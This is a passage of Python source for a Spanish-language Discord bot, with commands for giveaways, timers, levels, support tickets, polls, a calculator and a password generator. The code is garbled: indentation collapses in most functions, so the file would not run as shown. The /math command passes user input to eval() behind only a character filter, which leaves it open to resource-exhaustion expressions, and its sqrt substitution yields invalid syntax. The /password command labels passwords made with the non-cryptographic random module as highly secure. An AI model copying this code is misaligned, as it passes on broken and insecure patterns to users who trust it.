          ephemeral=True)
      return

  if len(self.participants) == 0:
      await interaction.response.send_message(
          "❌ No hay participantes en el sorteo.", ephemeral=True)
      return

  # Seleccionar ganadores
  participants_list = list(self.participants)
  winners_count = min(self.winners_count, len(participants_list))
  winners = random.sample(participants_list, winners_count)

  # Crear embed de resultados
  embed = discord.Embed(title="🎊 ¡SORTEO FINALIZADO!",
                        color=discord.Color.gold())

  giveaway_data = active_giveaways.get(self.giveaway_id, {})
  embed.add_field(name="🎁 Premio",
                  value=giveaway_data.get('prize', 'No especificado'),
                  inline=False)

  winners_text = ""
  for i, winner_id in enumerate(winners):
      try:
          winner = bot.get_user(winner_id)
          if winner:
              winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
          else:
              winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
      except:
          winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

  embed.add_field(name="🏆 Ganadores", value=winners_text, inline=False)
  embed.add_field(
      name="📊 Estadísticas",
      value=f"**{len(self.participants)}** participantes totales",
      inline=False)
  embed.set_footer(
      text=f"Sorteo finalizado por {interaction.user.display_name}")

  # Deshabilitar botones
  for item in self.children:
      item.disabled = True

  await interaction.response.edit_message(embed=embed, view=self)

  # Eliminar del registro
  if self.giveaway_id in active_giveaways:
      del active_giveaways[self.giveaway_id]


@bot.tree.command(name="gstart", description="Iniciar un sorteo interactivo")
@discord.app_commands.describe(
duration="Duración en minutos (opcional, por defecto sin límite)",
winners="Número de ganadores",
prize="Premio del sorteo")
async def gstart(interaction: discord.Interaction,
           winners: int,
           prize: str,
           duration: int = 0):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if winners <= 0:
  await interaction.response.send_message(
      "❌ El número de ganadores debe ser mayor a 0.", ephemeral=True)
  return

if winners > 20:
  await interaction.response.send_message(
      "❌ El número máximo de ganadores es 20.", ephemeral=True)
  return

# Generar ID único para el sorteo
giveaway_id = f"{interaction.guild.id}_{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

# Guardar datos del sorteo
active_giveaways[giveaway_id] = {
  'author_id': interaction.user.id,
  'prize': prize,
  'winners_count': winners,
  'channel_id': interaction.channel.id
}

# Crear embed del sorteo
embed = discord.Embed(
  title="🎉 ¡NUEVO SORTEO!",
  description=f"¡Participa haciendo clic en el botón de abajo!",
  color=discord.Color.blue())

embed.add_field(name="🎁 Premio", value=prize, inline=True)
embed.add_field(name="🏆 Ganadores",
              value=f"{winners} ganador{'es' if winners > 1 else ''}",
              inline=True)
embed.add_field(name="👥 Participantes",
              value="**0** usuarios participando",
              inline=True)

if duration > 0:
  end_time = datetime.datetime.utcnow() + datetime.timedelta(
      minutes=duration)
  embed.add_field(name="⏰ Finaliza",
                  value=f"<t:{int(end_time.timestamp())}:R>",
                  inline=False)
else:
  embed.add_field(name="⏰ Duración",
                  value="Sin límite de tiempo (finalizar manualmente)",
                  inline=False)

embed.set_footer(text=f"Sorteo creado por {interaction.user.display_name}",
               icon_url=interaction.user.display_avatar.url)

# Crear vista con botones
view = GiveawayView(giveaway_id, winners)

await interaction.response.send_message(embed=embed, view=view)

# Si tiene duración, programar finalización automática
if duration > 0:
  await asyncio.sleep(duration * 60)

  # Verificar si el sorteo sigue activo
  if giveaway_id in active_giveaways:
      try:
          message = await interaction.original_response()

          if len(view.participants) == 0:
              embed = discord.Embed(
                  title="⏰ Sorteo Terminado",
                  description="El sorteo ha terminado sin participantes.",
                  color=discord.Color.orange())
              embed.add_field(name="🎁 Premio", value=prize, inline=False)

              for item in view.children:
                  item.disabled = True

              await message.edit(embed=embed, view=view)
          else:
              # Finalizar automáticamente
              participants_list = list(view.participants)
              winners_count = min(winners, len(participants_list))
              auto_winners = random.sample(participants_list,
                                           winners_count)

              embed = discord.Embed(
                  title="⏰ ¡SORTEO TERMINADO AUTOMÁTICAMENTE!",
                  color=discord.Color.gold())

              embed.add_field(name="🎁 Premio", value=prize, inline=False)

              winners_text = ""
              for i, winner_id in enumerate(auto_winners):
                  try:
                      winner = bot.get_user(winner_id)
                      if winner:
                          winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
                      else:
                          winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
                  except:
                      winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

              embed.add_field(name="🏆 Ganadores",
                              value=winners_text,
                              inline=False)
              embed.add_field(
                  name="📊 Estadísticas",
                  value=
                  f"**{len(view.participants)}** participantes totales",
                  inline=False)
              embed.set_footer(
                  text="Sorteo finalizado automáticamente por tiempo")

              for item in view.children:
                  item.disabled = True

              await message.edit(embed=embed, view=view)

          # Limpiar del registro
          if giveaway_id in active_giveaways:
              del active_giveaways[giveaway_id]

      except Exception as e:
          print(f"Error al finalizar sorteo automáticamente: {e}")


# Sistema de temporizadores
active_timers = {}


@bot.tree.command(name="timer", description="Establecer un temporizador")
@discord.app_commands.describe(duration="Duración en minutos",
                         message="Mensaje personalizado (opcional)")
async def timer(interaction: discord.Interaction,
          duration: int,
          message: str = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if duration <= 0:
  await interaction.response.send_message(
      "❌ La duración debe ser mayor a 0 minutos.", ephemeral=True)
  return

if duration > 1440:  # 24 horas máximo
  await interaction.response.send_message(
      "❌ La duración máxima es de 1440 minutos (24 horas).",
      ephemeral=True)
  return

# Crear ID único para el temporizador
timer_id = f"{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

# Calcular tiempo de finalización
end_time = datetime.datetime.utcnow() + datetime.timedelta(
  minutes=duration)

# Guardar temporizador activo
active_timers[timer_id] = {
  'user_id': interaction.user.id,
  'channel_id': interaction.channel.id,
  'message': message or "¡Tu temporizador ha terminado!",
  'end_time': end_time
}

# Crear embed del temporizador
embed = discord.Embed(title="⏰ Temporizador Establecido",
                    color=discord.Color.blue())

embed.add_field(name="⏱️ Duración",
              value=f"{duration} minutos",
              inline=True)
embed.add_field(name="🕐 Finaliza",
              value=f"<t:{int(end_time.timestamp())}:R>",
              inline=True)
embed.add_field(name="💬 Mensaje",
              value=message or "¡Tu temporizador ha terminado!",
              inline=False)
embed.set_footer(text=f"Temporizador de {interaction.user.display_name}",
               icon_url=interaction.user.display_avatar.url)

await interaction.response.send_message(embed=embed)

# Esperar el tiempo especificado
await asyncio.sleep(duration * 60)

# Verificar si el temporizador sigue activo
if timer_id in active_timers:
  timer_data = active_timers[timer_id]

  try:
      # Crear embed de notificación
      notification_embed = discord.Embed(
          title="⏰ ¡TEMPORIZADOR TERMINADO!",
          description=timer_data['message'],
          color=discord.Color.green())
      notification_embed.add_field(name="⏱️ Duración",
                                   value=f"{duration} minutos",
                                   inline=True)
      notification_embed.set_footer(text="Tu temporizador ha expirado")

      # Mencionar al usuario
      channel = bot.get_channel(timer_data['channel_id'])
      if channel:
          user = bot.get_user(timer_data['user_id'])
          user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
          await channel.send(f"⏰ {user_mention}",
                             embed=notification_embed)

      # Limpiar del registro
      del active_timers[timer_id]

  except Exception as e:
      print(f"Error al enviar notificación de temporizador: {e}")
      # Limpiar del registro incluso si hay error
      if timer_id in active_timers:
          del active_timers[timer_id]


# ================================
# SISTEMA DE MODERACIÓN AUTOMÁTICA
# ================================

# Configuración de automod
automod_enabled = {}
automod_settings = {}
warning_counts = {}


@bot.tree.command(name="automod",
            description="Configurar sistema de moderación automática")
@discord.app_commands.describe(
enable="Activar o desactivar automod",
spam_limit="Límite de mensajes por minuto antes de tomar acción",
warn_threshold="Número de advertencias antes de aplicar castigo")
async def automod_setup(interaction: discord.Interaction,
                  enable: bool,
                  spam_limit: int = 10,
                  warn_threshold: int = 3):
if not interaction.user.guild_permissions.manage_guild:
  await interaction.response.send_message(
      "❌ Necesitas permisos de **Administrar Servidor**.",
      ephemeral=True)
  return

guild_id = interaction.guild.id
automod_enabled[guild_id] = enable
automod_settings[guild_id] = {
  'spam_limit': spam_limit,
  'warn_threshold': warn_threshold
}

embed = discord.Embed(
  title="🛡️ Sistema de Moderación Automática",
  description=
  f"**Estado:** {'✅ Activado' if enable else '❌ Desactivado'}",
  color=discord.Color.green() if enable else discord.Color.red())

if enable:
  embed.add_field(
      name="📊 Configuración",
      value=
      f"• Límite de spam: {spam_limit} msg/min\n• Advertencias máximas: {warn_threshold}",
      inline=False)

await interaction.response.send_message(embed=embed)


# Filtro de palabras prohibidas
banned_words = [
# Palabras ofensivas básicas
"idiota",
"estupido",
"imbecil",
"tonto",
"burro",
# Insultos más fuertes (censurados)
"m*****",
"c*****",
"p****",
"h***",
"z****"
]


# Sistema de niveles/experiencia
levels_file = 'levels.json'
if os.path.exists(levels_file):
  with open(levels_file, 'r') as f:
      user_levels = json.load(f)
else:
  user_levels = {}


def save_levels():
  with open(levels_file, 'w') as f:
      json.dump(user_levels, f)


def get_user_level_data(user_id):
  user_id = str(user_id)
  if user_id not in user_levels:
      user_levels[user_id] = {"xp": 0, "level": 1, "messages": 0}
  return user_levels[user_id]


def add_xp(user_id, xp_amount):
  user_id = str(user_id)
  data = get_user_level_data(user_id)
  data["xp"] += xp_amount
  data["messages"] += 1

  # Calcular nuevo nivel
  xp_needed = data["level"] * 100
  if data["xp"] >= xp_needed:
      data["level"] += 1
      data["xp"] = data["xp"] - xp_needed
      save_levels()
      return True  # Subió de nivel

  save_levels()
  return False  # No subió de nivel


# Función auxiliar para sistema de niveles (sin decorador @bot.event)
async def process_level_system(message):
    if message.author.bot:
        return

    # Sistema de niveles (XP por mensaje)
    xp_gained = random.randint(5, 15)
    leveled_up = add_xp(message.author.id, xp_gained)

    if leveled_up:
        data = get_user_level_data(message.author.id)
        embed = discord.Embed(
            title="🎉 ¡Subiste de Nivel!",
            description=
            f"{message.author.mention} alcanzó el **Nivel {data['level']}**!",
            color=discord.Color.gold())
        await message.channel.send(embed=embed, delete_after=10)


@bot.tree.command(name="level", description="Ver tu nivel y experiencia")
@discord.app_commands.describe(user="Usuario del que ver el nivel (opcional)")
async def check_level(interaction: discord.Interaction,
                user: discord.Member = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

target = user or interaction.user
data = get_user_level_data(target.id)

xp_needed = data["level"] * 100
progress = (data["xp"] / xp_needed) * 100

embed = discord.Embed(title=f"📊 Nivel de {target.display_name}",
                    color=target.color if target.color
                    != discord.Color.default() else discord.Color.blue())
embed.set_thumbnail(url=target.display_avatar.url)

embed.add_field(name="🏆 Nivel", value=data["level"], inline=True)
embed.add_field(name="⭐ XP",
              value=f"{data['xp']}/{xp_needed}",
              inline=True)
embed.add_field(name="💬 Mensajes", value=data["messages"], inline=True)
embed.add_field(name="📈 Progreso", value=f"{progress:.1f}%", inline=False)

# Barra de progreso visual
filled = int(progress // 10)
bar = "█" * filled + "░" * (10 - filled)
embed.add_field(name="📊 Barra de Progreso", value=f"`{bar}`", inline=False)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="leaderboard_levels",
            description="Ver ranking de niveles del servidor")
async def level_leaderboard(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Crear lista de usuarios con sus niveles
user_list = []
for user_id, data in user_levels.items():
  try:
      user = bot.get_user(int(user_id))
      if user and not user.bot:
          total_xp = (data["level"] - 1) * 100 + data["xp"]
          user_list.append((user.display_name, data["level"], total_xp,
                            data["messages"]))
  except:
      continue

# Ordenar por nivel y luego por XP total
user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
user_list = user_list[:10]  # Top 10

embed = discord.Embed(title="🏆 Ranking de Niveles",
                    color=discord.Color.gold())

if not user_list:
  embed.description = "No hay datos de niveles disponibles."
else:
  description = ""
  medals = ["🥇", "🥈", "🥉"]
  for i, (name, level, total_xp, messages) in enumerate(user_list):
      medal = medals[i] if i < 3 else f"{i+1}."
      description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
  embed.description = description

await interaction.response.send_message(embed=embed)


# ================================
# SISTEMA DE TICKETS DE SOPORTE
# ================================

active_tickets = {}


class TicketView(discord.ui.View):

def __init__(self):
  super().__init__(timeout=None)

@discord.ui.button(label='🎫 Crear Ticket',
                 style=discord.ButtonStyle.green,
                 custom_id='create_ticket')
async def create_ticket(self, interaction: discord.Interaction,
                      button: discord.ui.Button):
  guild = interaction.guild
  user = interaction.user

  # Verificar si ya tiene un ticket abierto
  existing_ticket = None
  for channel in guild.channels:
      if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
          existing_ticket = channel
          break

  if existing_ticket:
      await interaction.response.send_message(
          f"❌ Ya tienes un ticket abierto: {existing_ticket.mention}",
          ephemeral=True)
      return

  # Crear canal de ticket
  try:
      overwrites = {
          guild.default_role:
          discord.PermissionOverwrite(read_messages=False),
          user:
          discord.PermissionOverwrite(read_messages=True,
                                      send_messages=True),
          guild.me:
          discord.PermissionOverwrite(read_messages=True,
                                      send_messages=True)
      }

      # Buscar rol de moderador o admin
      mod_role = None
      for role in guild.roles:
          if any(name in role.name.lower()
                 for name in ['mod', 'admin', 'staff', 'soporte']):
              mod_role = role
              overwrites[role] = discord.PermissionOverwrite(
                  read_messages=True, send_messages=True)
              break

      ticket_channel = await guild.create_text_channel(
          f"ticket-{user.id}",
          overwrites=overwrites,
          category=None,
          reason=f"Ticket de soporte creado por {user.name}")

      # Mensaje inicial del ticket
      embed = discord.Embed(
          title="🎫 Ticket de Soporte Creado",
          description=f"Hola {user.mention}! Tu ticket ha sido creado.\n\n"
          f"📝 **Describe tu problema** y el equipo de soporte te ayudará pronto.\n"
          f"🔒 Para cerrar este ticket, usa el botón de abajo.",
          color=discord.Color.blue())
      embed.set_footer(text=f"Ticket ID: {user.id}")

      close_view = CloseTicketView()
      await ticket_channel.send(embed=embed, view=close_view)

      # Mensaje de confirmación
      await interaction.response.send_message(
          f"✅ Tu ticket ha sido creado: {ticket_channel.mention}",
          ephemeral=True)

      # Guardar ticket activo
      active_tickets[user.id] = ticket_channel.id

  except Exception as e:
      await interaction.response.send_message(
          f"❌ Error al crear el ticket: {str(e)}", ephemeral=True)


class CloseTicketView(discord.ui.View):

def __init__(self):
  super().__init__(timeout=None)

@discord.ui.button(label='🔒 Cerrar Ticket',
                 style=discord.ButtonStyle.red,
                 custom_id='close_ticket')
async def close_ticket(self, interaction: discord.Interaction,
                     button: discord.ui.Button):
  channel = interaction.channel

  # Confirmar cierre
  embed = discord.Embed(
      title="⚠️ Confirmar Cierre",
      description=
      "¿Estás seguro de que quieres cerrar este ticket?\n\n**Esta acción no se puede deshacer.**",
      color=discord.Color.orange())

  confirm_view = ConfirmCloseView()
  await interaction.response.send_message(embed=embed,
                                          view=confirm_view,
                                          ephemeral=True)


class ConfirmCloseView(discord.ui.View):

def __init__(self):
  super().__init__(timeout=60)

@discord.ui.button(label='✅ Sí, cerrar',
                 style=discord.ButtonStyle.red,
                 custom_id='confirm_close')
async def confirm_close(self, interaction: discord.Interaction,
                      button: discord.ui.Button):
  channel = interaction.channel

  try:
      # Remover de tickets activos
      user_id = None
      for uid, cid in active_tickets.items():
          if cid == channel.id:
              user_id = uid
              break

      if user_id:
          del active_tickets[user_id]

      await interaction.response.send_message(
          "🔒 **Cerrando ticket...** Este canal se eliminará en 5 segundos.",
          ephemeral=False)
      await asyncio.sleep(5)
      await channel.delete(reason="Ticket cerrado")

  except Exception as e:
      await interaction.response.send_message(
          f"❌ Error al cerrar el ticket: {str(e)}", ephemeral=True)

@discord.ui.button(label='❌ Cancelar',
                 style=discord.ButtonStyle.gray,
                 custom_id='cancel_close')
async def cancel_close(self, interaction: discord.Interaction,
                     button: discord.ui.Button):
  await interaction.response.send_message(
      "✅ Cierre cancelado. El ticket permanece abierto.", ephemeral=True)


@bot.tree.command(
name="ticket_setup",
description="Configurar sistema de tickets en el canal actual")
async def setup_tickets(interaction: discord.Interaction):
if not interaction.user.guild_permissions.manage_channels:
  await interaction.response.send_message(
      "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
  return

embed = discord.Embed(
  title="🎫 Sistema de Tickets de Soporte",
  description=
  "**¿Necesitas ayuda?** Crea un ticket de soporte haciendo clic en el botón de abajo.\n\n"
  "🔹 **¿Para qué usar los tickets?**\n"
  "• Reportar problemas\n"
  "• Solicitar ayuda\n"
  "• Consultas privadas\n"
  "• Sugerencias\n\n"
  "⏱️ **Tiempo de respuesta promedio:** 1-24 horas",
  color=discord.Color.blue())
embed.set_footer(text="Haz clic en 'Crear Ticket' para empezar")

view = TicketView()
await interaction.response.send_message(embed=embed, view=view)


# ================================
# COMANDOS ADICIONALES DE UTILIDAD
# ================================


@bot.tree.command(name="clear", description="Eliminar mensajes del canal")
@discord.app_commands.describe(amount="Número de mensajes a eliminar (1-100)")
async def clear_messages(interaction: discord.Interaction, amount: int):
if not interaction.user.guild_permissions.manage_messages:
  await interaction.response.send_message(
      "❌ Necesitas permisos de **Administrar Mensajes**.",
      ephemeral=True)
  return

if amount < 1 or amount > 100:
  await interaction.response.send_message(
      "❌ Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
  return

await interaction.response.defer()

try:
  deleted = await interaction.channel.purge(limit=amount)
  embed = discord.Embed(
      title="🗑️ Mensajes Eliminados",
      description=f"Se eliminaron **{len(deleted)}** mensajes.",
      color=discord.Color.green())
  await interaction.followup.send(embed=embed, delete_after=10)
except Exception as e:
  await interaction.followup.send(
      f"❌ Error al eliminar mensajes: {str(e)}", ephemeral=True)


@bot.tree.command(name="userinfo", description="Ver información de un usuario")
@discord.app_commands.describe(user="Usuario del que ver la información")
async def user_info(interaction: discord.Interaction,
              user: discord.Member = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

target = user or interaction.user

embed = discord.Embed(title=f"👤 Información de {target.display_name}",
                    color=target.color if target.color
                    != discord.Color.default() else discord.Color.blue())
embed.set_thumbnail(url=target.display_avatar.url)

# Información básica
embed.add_field(name="📛 Nombre",
              value=f"{target.name}#{target.discriminator}",
              inline=True)
embed.add_field(name="🆔 ID", value=target.id, inline=True)
embed.add_field(name="🤖 Bot",
              value="✅" if target.bot else "❌",
              inline=True)

# Fechas
embed.add_field(name="📅 Cuenta creada",
              value=f"<t:{int(target.created_at.timestamp())}:R>",
              inline=True)
embed.add_field(name="📥 Se unió al servidor",
              value=f"<t:{int(target.joined_at.timestamp())}:R>",
              inline=True)

# Roles
roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
embed.add_field(name=f"🏷️ Roles ({len(roles)})",
              value=" ".join(roles[:5]) +
              (f" y {len(roles)-5} más..." if len(roles) > 5 else "")
              if roles else "Ninguno",
              inline=False)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="poll", description="Crear una encuesta")
@discord.app_commands.describe(question="Pregunta de la encuesta",
                         option1="Primera opción",
                         option2="Segunda opción",
                         option3="Tercera opción (opcional)",
                         option4="Cuarta opción (opcional)")
async def create_poll(interaction: discord.Interaction,
                question: str,
                option1: str,
                option2: str,
                option3: str = None,
                option4: str = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

options = [option1, option2]
if option3: options.append(option3)
if option4: options.append(option4)

embed = discord.Embed(title="📊 Encuesta",
                    description=f"**{question}**",
                    color=discord.Color.blue())

reactions = ['1️⃣', '2️⃣', '3️⃣', '4️⃣']
description = ""
for i, option in enumerate(options):
  description += f"\n{reactions[i]} {option}"

embed.add_field(name="Opciones:", value=description, inline=False)
embed.set_footer(
  text=f"Encuesta creada por {interaction.user.display_name}")

await interaction.response.send_message(embed=embed)
message = await interaction.original_response()

# Añadir reacciones
for i in range(len(options)):
  await message.add_reaction(reactions[i])


# ================================
# COMANDOS DE DIVERSIÓN ADICIONALES
# ================================


@bot.tree.command(name="meme", description="Obtener un meme aleatorio")
async def get_meme(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

memes = [
  "https://i.imgur.com/XyLOD.jpg", "https://i.imgur.com/fPUUf.jpg",
  "https://i.imgur.com/dQaJk.jpg"
]

embed = discord.Embed(title="😂 Meme Aleatorio",
                    color=discord.Color.random())
embed.set_image(url=random.choice(memes))

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="8ball", description="Pregunta a la bola mágica")
@discord.app_commands.describe(question="Tu pregunta")
async def eight_ball(interaction: discord.Interaction, question: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

responses = [
  "🎱 Es cierto.", "🎱 Es decididamente así.", "🎱 Sin duda.",
  "🎱 Sí, definitivamente.", "🎱 Puedes confiar en ello.",
  "🎱 Como yo lo veo, sí.", "🎱 Muy probable.",
  "🎱 Las perspectivas son buenas.", "🎱 Sí.",
  "🎱 Las señales apuntan a que sí.",
  "🎱 Respuesta confusa, intenta de nuevo.",
  "🎱 Pregunta de nuevo más tarde.", "🎱 Mejor no te lo digo ahora.",
  "🎱 No puedo predecirlo ahora.", "🎱 Concéntrate y pregunta de nuevo.",
  "🎱 No cuentes con ello.", "🎱 Mi respuesta es no.",
  "🎱 Mis fuentes dicen que no.", "🎱 Las perspectivas no son tan buenas.",
  "🎱 Muy dudoso."
]

embed = discord.Embed(
  title="🎱 Bola Mágica",
  description=f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
  color=discord.Color.purple())

await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================

@bot.tree.command(name="avatar", description="Ver el avatar de un usuario")
@discord.app_commands.describe(user="Usuario del que ver el avatar")
async def avatar_command(interaction: discord.Interaction, user: discord.Member = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

target = user or interaction.user

embed = discord.Embed(
  title=f"🖼️ Avatar de {target.display_name}",
  color=target.color if target.color != discord.Color.default() else discord.Color.blue())

embed.set_image(url=target.display_avatar.url)
embed.add_field(name="🔗 Enlace directo", 
             value=f"[Descargar]({target.display_avatar.url})", 
             inline=False)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="math", description="Calculadora básica")
@discord.app_commands.describe(expression="Expresión matemática (ej: 2+2, 10*5, sqrt(16))")
async def math_command(interaction: discord.Interaction, expression: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

try:
  # Reemplazar funciones comunes
  expression = expression.replace("sqrt", "**0.5")
  expression = expression.replace("^", "**")

  # Evaluación segura solo con operadores matemáticos básicos
  allowed_chars = "0123456789+-*/.() "
  if all(c in allowed_chars for c in expression):
      result = eval(expression)

      embed = discord.Embed(
          title="🔢 Calculadora",
          color=discord.Color.green())
      embed.add_field(name="📝 Expresión", value=f"`{expression}`", inline=False)
      embed.add_field(name="✅ Resultado", value=f"`{result}`", inline=False)

      await interaction.response.send_message(embed=embed)
  else:
      await interaction.response.send_message(
          "❌ Solo se permiten números y operadores matemáticos básicos (+, -, *, /, (), sqrt)",
          ephemeral=True)
except Exception as e:
  await interaction.response.send_message(
      f"❌ Error en la expresión matemática: {str(e)}", ephemeral=True)


@bot.tree.command(name="weather", description="Información meteorológica simulada")
@discord.app_commands.describe(city="Ciudad (simulación)")
async def weather_command(interaction: discord.Interaction, city: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Simulación de datos meteorológicos
temperatures = list(range(-5, 35))
conditions = ["☀️ Soleado", "⛅ Parcialmente nublado", "☁️ Nublado", 
           "🌧️ Lluvioso", "⛈️ Tormentoso", "🌨️ Nevando"]

temp = random.choice(temperatures)
condition = random.choice(conditions)
humidity = random.randint(30, 90)
wind_speed = random.randint(5, 25)

embed = discord.Embed(
  title=f"🌤️ Clima en {city.title()}",
  description=f"**{condition}**",
  color=discord.Color.blue())

embed.add_field(name="🌡️ Temperatura", value=f"{temp}°C", inline=True)
embed.add_field(name="💨 Viento", value=f"{wind_speed} km/h", inline=True)
embed.add_field(name="💧 Humedad", value=f"{humidity}%", inline=True)
embed.set_footer(text="⚠️ Datos simulados - No reales")

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="reminder", description="Crear un recordatorio")
@discord.app_commands.describe(time="Tiempo en minutos", message="Mensaje del recordatorio")
async def reminder_command(interaction: discord.Interaction, time: int, message: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if time <= 0 or time > 1440:  # Máximo 24 horas
  await interaction.response.send_message(
      "❌ El tiempo debe ser entre 1 minuto y 1440 minutos (24 horas).",
      ephemeral=True)
  return

end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=time)

embed = discord.Embed(
  title="⏰ Recordatorio Establecido",
  description=f"Te recordaré en **{time} minutos**",
  color=discord.Color.blue())
embed.add_field(name="📝 Mensaje", value=message, inline=False)
embed.add_field(name="🕐 Te recordaré", value=f"<t:{int(end_time.timestamp())}:R>", inline=False)

await interaction.response.send_message(embed=embed)

# Esperar y enviar recordatorio
await asyncio.sleep(time * 60)

try:
  reminder_embed = discord.Embed(
      title="🔔 ¡RECORDATORIO!",
      description=message,
      color=discord.Color.orange())
  reminder_embed.set_footer(text=f"Recordatorio de hace {time} minutos")

  await interaction.followup.send(f"⏰ {interaction.user.mention}", embed=reminder_embed)
except:
  pass


@bot.tree.command(name="flip", description="Lanzar una moneda")
async def flip_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

result = random.choice(["🪙 Cara", "🔄 Cruz"])

embed = discord.Embed(
  title="🪙 Lanzamiento de Moneda",
  description=f"**Resultado: {result}**",
  color=discord.Color.gold())

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="dice", description="Lanzar dados")
@discord.app_commands.describe(sides="Número de caras del dado (por defecto 6)", count="Cantidad de dados (por defecto 1)")
async def dice_command(interaction: discord.Interaction, sides: int = 6, count: int = 1):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if sides < 2 or sides > 100:
  await interaction.response.send_message(
      "❌ El dado debe tener entre 2 y 100 caras.", ephemeral=True)
  return

if count < 1 or count > 10:
  await interaction.response.send_message(
      "❌ Puedes lanzar entre 1 y 10 dados.", ephemeral=True)
  return

results = [random.randint(1, sides) for _ in range(count)]
total = sum(results)

embed = discord.Embed(
  title=f"🎲 Lanzamiento de Dados (d{sides})",
  color=discord.Color.red())

embed.add_field(name="🎯 Resultados", 
             value=" | ".join([f"**{r}**" for r in results]), 
             inline=False)
embed.add_field(name="📊 Total", value=f"**{total}**", inline=True)
embed.add_field(name="📈 Promedio", value=f"**{total/count:.1f}**", inline=True)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="password", description="Generar contraseña segura")
@discord.app_commands.describe(length="Longitud de la contraseña (8-50)")
async def password_command(interaction: discord.Interaction, length: int = 12):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if length < 8 or length > 50:
  await interaction.response.send_message(
      "❌ La longitud debe ser entre 8 y 50 caracteres.", ephemeral=True)
  return

import string
chars = string.ascii_letters + string.digits + "!@#$%^&*"
password = ''.join(random.choice(chars) for _ in range(length))

embed = discord.Embed(
  title="🔐 Contraseña Generada",
  description=f"```{password}```",
  color=discord.Color.green())
embed.add_field(name="📏 Longitud", value=f"{length} caracteres", inline=True)
embed.add_field(name="🔒 Seguridad", value="Alta", inline=True)
embed.set_footer(text="⚠️ Guarda esta contraseña en un lugar seguro")

await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="quote", description="Cita inspiradora aleatoria")
async def quote_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

quotes = [
  ("La vida es lo que ocurre mientras estás ocupado haciendo otros planes.", "John Lennon"),
  ("El único modo de hacer un gran trabajo es amar lo que haces.", "Steve Jobs"),
  ("La innovación distingue entre un líder y un seguidor.", "Steve Jobs"),
  ("El éxito es ir de fracaso en fracaso sin perder el entusiasmo.", "Winston Churchill"),
  ("La imaginación es más importante que el conocimiento.", "Albert Einstein"),
  ("No puedes conectar los puntos mirando hacia adelante.", "Steve Jobs"),
  ("La única forma de hacer algo bien es hacerlo con pasión.", "Anónimo"),
  ("El fracaso es simplemente la oportunidad de comenzar de nuevo.", "Henry Ford"),
  ("Tu tiempo es limitado, no lo malgastes viviendo la vida de otro.", "Steve Jobs"),
  ("La diferencia entre lo ordinario y lo extraordinario es ese pequeño extra.", "Jimmy Johnson")
]

quote_text, author = random.choice(quotes)

embed = discord.Embed(
  title="💭 Cita Inspiradora",
  description=f"*\"{quote_text}\"*",
  color=discord.Color.purple())
embed.set_footer(text=f"— {author}")

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="translate", description="Traductor simulado")
